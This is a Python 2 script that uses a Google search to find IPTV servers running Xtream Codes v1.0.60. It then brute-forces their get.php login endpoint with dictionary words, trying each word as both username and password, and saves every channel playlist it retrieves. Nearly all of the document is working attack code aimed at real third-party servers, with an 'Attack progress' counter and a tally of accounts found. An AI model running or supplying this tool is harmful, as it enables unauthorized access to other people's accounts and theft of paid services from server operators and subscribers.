#!/usr/bin/python

import os
from os import path
import sys
import socket
import google
import urllib2
import argparse
import warnings
from urlparse import urlparse
warnings.filterwarnings("ignore")
reload(sys)  
sys.setdefaultencoding('utf8')

outputDir = "output"
dictDir = "dictionary"

parsedUrls = []
basicString = "/get.php?username=%s&password=%s&type=m3u&output=mpegts"
searchString = "\"Xtream Codes v1.0.60 Copyright 2014-2015\""

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--servers', help="Number of target servers", required=True)
parser.add_argument('-l', '--language', help="Preferred language (en, ru, es, ..)", required=True)
args = parser.parse_args()

print "Language          : " + args.language
    
dictionaries = os.listdir(dictDir)

if (len(dictionaries) <= 0):
    sys.exit("No dictionary found in \"%s/\"" % dictDir) 
    
print "Found dictionaries:", len(dictionaries)

print "Looking for", args.servers, "IPTV servers..."
    
# Google Search 
counter = 1
for url in google.search(searchString, lang=args.language, num=int(args.servers), stop=1):
    error = 0
    found = 0
    pointer = 1
    print "=============================================================="
    print "[", counter, "] Found server at: " + url
    parsed = urlparse(url)
    newURL = parsed.scheme + "://" + parsed.netloc
    parsedUrls.append(newURL)
    
    print "[", counter, "] Scanning: " + newURL + " (this might take a long time, be patient)"
    
    for dict in sorted(dictionaries):
        with open(dictDir + "/" + dict) as f:
            rows = f.readlines()
            
        with open(dictDir + "/" + dict) as g:
            fileLength = len(g.readlines())

        print "[", counter, "] Using dictionary: " + dict + " (%d words)" % fileLength
                
        
        for row in rows:
            progress = float(pointer) / float(fileLength) * 100
            sys.stdout.write("Attack progress: %d%% (%d/%d) (Accounts found: %d) \r" % (progress, pointer, fileLength, found) )
            sys.stdout.flush()
            pointer += 1
            try:
                opener = urllib2.build_opener()
                opener.addheaders = [('User-agent', 'Mozilla/5.0')]
                response = opener.open(newURL + basicString % (row.rstrip().lstrip(), row.rstrip().lstrip()), timeout = 10)
                fetched = response.read()
                # IF the fetched content is not empty
                # we build the dedicated .m3u file
                if len(fetched) > 0:
                    newPath = outputDir + "/" + args.language + "/" + url.replace("http://", "")
                    if os.path.exists(newPath) is False:
                        os.makedirs(newPath)
                    outputFile = open(str(newPath) + "/tv_channels_%s.m3u" % row.rstrip().lstrip(), "w")
                    outputFile.write(fetched)
                    outputFile.close()            
                    found += 1
                    counter += 1
            except urllib2.HTTPError, e:
                print "[", counter, "] Ops, HTTPError exception here. Cannot fetch the current URL " + newURL + " (" + str(e.code) + ")"
                counter += 1
                error += 1
                break
            except urllib2.URLError, e:
                print "[", counter, "] Ops, the URL seems broken. " + str(e.reason)
                counter += 1
                error += 1
                break
            except socket.timeout:
                print "[", counter, "] Ops, socket timeout."
                counter += 1
                # no need to increase error here as we want to still scan the same server with the next dictionary
                break
        #print newURL + ": all done."
        parsedUrls.remove(newURL)
        if (error > 0): 
            print "[", counter -1, "] Connection error, skipping server..."
            break; 
        print "[", counter, "] Accounts discovered on " + newURL + ":", found
    
print "All done. Enjoy."    
